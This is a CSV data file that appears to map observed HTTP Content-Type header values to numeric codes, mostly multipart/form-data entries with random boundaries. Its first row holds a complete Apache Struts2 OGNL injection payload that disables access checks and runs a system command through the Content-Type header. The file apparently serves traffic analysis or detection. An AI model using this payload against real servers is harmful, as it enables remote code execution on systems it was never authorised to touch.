requestContentType,encoder,mode_is
"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",0,0
Application/json,1,0
Nan,2,1
application/json,3,0
application/json; charset=UTF-8,4,0
application/json; charset=utf-8,5,0
application/json;charset=UTF-8,6,0
application/multipart-formdata,7,0
application/octet-stream,8,0
application/octet-stream;tt-data=a,9,0
application/protobuf,10,0
application/soap+xml,11,0
application/vnd.openxmlformats-officedocument.wordprocessingml.document,12,0
application/x-amf,13,0
application/x-enc,14,0
application/x-git-receive-pack-request,15,0
application/x-gzip,16,0
application/x-msdownload,17,0
application/x-protobuf,18,0
application/x-www-form-urlencoded,19,0
application/x-www-form-urlencoded; charset=UTF-8,20,0
application/x-www-form-urlencoded; charset=utf-8,21,0
application/xml,22,0
application/zip,23,0
"application/zip;filename=""NetError.zip""",24,0
binary/octet-stream,25,0
image/png,26,0
multipart/form-data,27,0
multipart/form-data; boundary=******--212x89--,28,0
multipart/form-data; boundary=----------------------------009c10210822,29,0
multipart/form-data; boundary=----------------------------009e51589012,30,0
multipart/form-data; boundary=----------------------------00a938c5a4fa,31,0
multipart/form-data; boundary=----------------------------00adb3253966,32,0
multipart/form-data; boundary=----------------------------00e4c66f9bff,33,0
multipart/form-data; boundary=----------------------------012301878f42,34,0
multipart/form-data; boundary=----------------------------012cfe3428e0,35,0
multipart/form-data; boundary=----------------------------01481a018791,36,0
multipart/form-data; boundary=----------------------------024121798930,37,0
multipart/form-data; boundary=----------------------------02c45d683a3a,38,0
multipart/form-data; boundary=----------------------------02c8d40e1136,39,0
multipart/form-data; boundary=----------------------------02fccf674bde,40,0
multipart/form-data; boundary=----------------------------03381ad649b5,41,0
multipart/form-data; boundary=----------------------------033ecc7f2381,42,0
multipart/form-data; boundary=----------------------------0356452172ff,43,0
multipart/form-data; boundary=----------------------------0374da4aef10,44,0
multipart/form-data; boundary=----------------------------03e993ed333d,45,0
multipart/form-data; boundary=----------------------------0441409b120d,46,0
multipart/form-data; boundary=----------------------------048014201f79,47,0
multipart/form-data; boundary=----------------------------049a6fe9801f,48,0
multipart/form-data; boundary=----------------------------04ad4be995eb,49,0
multipart/form-data; boundary=----------------------------04c2c2f662b6,50,0
multipart/form-data; boundary=----------------------------04eebc0912f1,51,0
multipart/form-data; boundary=----------------------------04f2d9b40963,52,0
multipart/form-data; boundary=----------------------------052748510fe1,53,0
multipart/form-data; boundary=----------------------------054a7056218d,54,0
multipart/form-data; boundary=----------------------------0562fe2c492a,55,0
multipart/form-data; boundary=----------------------------058a55c01f83,56,0
multipart/form-data; boundary=----------------------------05ce7393dacb,57,0
multipart/form-data; boundary=----------------------------061e6d343bcc,58,0
multipart/form-data; boundary=----------------------------068002770ad0,59,0
multipart/form-data; boundary=----------------------------06c1eb0880ff,60,0
multipart/form-data; boundary=----------------------------07065fec5c89,61,0
multipart/form-data; boundary=----------------------------0745d61aa5c6,62,0
multipart/form-data; boundary=----------------------------07b575bcf430,63,0
multipart/form-data; boundary=----------------------------08266292fa0c,64,0
multipart/form-data; boundary=----------------------------08477d643cf5,65,0
multipart/form-data; boundary=----------------------------08cd2c354684,66,0
multipart/form-data; boundary=----------------------------08dee2b60966,67,0
multipart/form-data; boundary=----------------------------08ea49327307,68,0
multipart/form-data; boundary=----------------------------0926a381931c,69,0
multipart/form-data; boundary=----------------------------0926c06a96f3,70,0
multipart/form-data; boundary=----------------------------096b340c99de,71,0
multipart/form-data; boundary=----------------------------09a6f4703f3a,72,0
multipart/form-data; boundary=----------------------------09e00e85ea72,73,0
multipart/form-data; boundary=----------------------------09e6ca0afa11,74,0
multipart/form-data; boundary=----------------------------0a1369919139,75,0
multipart/form-data; boundary=----------------------------0a25af00ef44,76,0
multipart/form-data; boundary=----------------------------0a5637d4a7f1,77,0
multipart/form-data; boundary=----------------------------0ace8c238b85,78,0
multipart/form-data; boundary=----------------------------0ad228cefaed,79,0
multipart/form-data; boundary=----------------------------0b416a7f8a43,80,0
multipart/form-data; boundary=----------------------------0b4d698ddae6,81,0
multipart/form-data; boundary=----------------------------0b4e62d94b3e,82,0
multipart/form-data; boundary=----------------------------0b605704bf64,83,0
multipart/form-data; boundary=----------------------------0b77010b0866,84,0
multipart/form-data; boundary=----------------------------0b92ccc1d2f7,85,0
multipart/form-data; boundary=----------------------------0b95e97cc858,86,0
multipart/form-data; boundary=----------------------------0bc5d4712800,87,0
multipart/form-data; boundary=----------------------------0c04a679401f,88,0
multipart/form-data; boundary=----------------------------0c23d5fa0164,89,0
multipart/form-data; boundary=----------------------------0c2762357727,90,0
multipart/form-data; boundary=----------------------------0c5609726b54,91,0
multipart/form-data; boundary=----------------------------0c76a851e16b,92,0
multipart/form-data; boundary=----------------------------0ca69df0be26,93,0
multipart/form-data; boundary=----------------------------0ca7f7eb9fcf,94,0
multipart/form-data; boundary=----------------------------0cb585606e28,95,0
multipart/form-data; boundary=----------------------------0cd5d1a84596,96,0
multipart/form-data; boundary=----------------------------0d1e3fc933c5,97,0
multipart/form-data; boundary=----------------------------0dbd67189fe5,98,0
multipart/form-data; boundary=----------------------------0e0f576a6090,99,0
multipart/form-data; boundary=----------------------------0ea6100dbc18,100,0
multipart/form-data; boundary=----------------------------0f19747edd1c,101,0
multipart/form-data; boundary=----------------------------10234959b8d6,102,0
multipart/form-data; boundary=----------------------------10281b759738,103,0
multipart/form-data; boundary=----------------------------10418b498fd9,104,0
multipart/form-data; boundary=----------------------------105b1434ba13,105,0
multipart/form-data; boundary=----------------------------10fcafdb6925,106,0
multipart/form-data; boundary=----------------------------1115b015adac,107,0
multipart/form-data; boundary=----------------------------118788b5318d,108,0
multipart/form-data; boundary=----------------------------11879ee9a6ab,109,0
multipart/form-data; boundary=----------------------------119211af7fea,110,0
multipart/form-data; boundary=----------------------------121766b6637e,111,0
multipart/form-data; boundary=----------------------------121d212ea328,112,0
multipart/form-data; boundary=----------------------------12370df348ab,113,0
multipart/form-data; boundary=----------------------------124374d0a9f3,114,0
multipart/form-data; boundary=----------------------------126554e7b7fa,115,0
multipart/form-data; boundary=----------------------------12abd7f69380,116,0
multipart/form-data; boundary=----------------------------12f33678dd77,117,0
multipart/form-data; boundary=----------------------------132a2d4dc067,118,0
multipart/form-data; boundary=----------------------------133042a0f1ab,119,0
multipart/form-data; boundary=----------------------------1356e596d24c,120,0
multipart/form-data; boundary=----------------------------13691cfc11ae,121,0
multipart/form-data; boundary=----------------------------13822678c95a,122,0
multipart/form-data; boundary=----------------------------138f6fbe2779,123,0
multipart/form-data; boundary=----------------------------13a5356fa670,124,0
multipart/form-data; boundary=----------------------------1425ff5b2014,125,0
multipart/form-data; boundary=----------------------------1433de905ca0,126,0
multipart/form-data; boundary=----------------------------1447f683716f,127,0
multipart/form-data; boundary=----------------------------146118cdb4f6,128,0
multipart/form-data; boundary=----------------------------14d0fcc9a532,129,0
multipart/form-data; boundary=----------------------------14f38dbab877,130,0
multipart/form-data; boundary=----------------------------150409cf5126,131,0
multipart/form-data; boundary=----------------------------151d41710794,132,0
multipart/form-data; boundary=----------------------------155f50e7e922,133,0
multipart/form-data; boundary=----------------------------156392c83180,134,0
multipart/form-data; boundary=----------------------------15b2892f0caa,135,0
multipart/form-data; boundary=----------------------------15b65b5ed8e9,136,0
multipart/form-data; boundary=----------------------------15e9f2d4acf5,137,0
multipart/form-data; boundary=----------------------------16169530be61,138,0
multipart/form-data; boundary=----------------------------168f97b618ac,139,0
multipart/form-data; boundary=----------------------------17142d08c00f,140,0
multipart/form-data; boundary=----------------------------1715fe32ef04,141,0
multipart/form-data; boundary=----------------------------17166e5136dc,142,0
multipart/form-data; boundary=----------------------------172f94061e25,143,0
multipart/form-data; boundary=----------------------------174b0963bbe4,144,0
multipart/form-data; boundary=----------------------------17b145be4588,145,0
multipart/form-data; boundary=----------------------------181d6ebacdf7,146,0
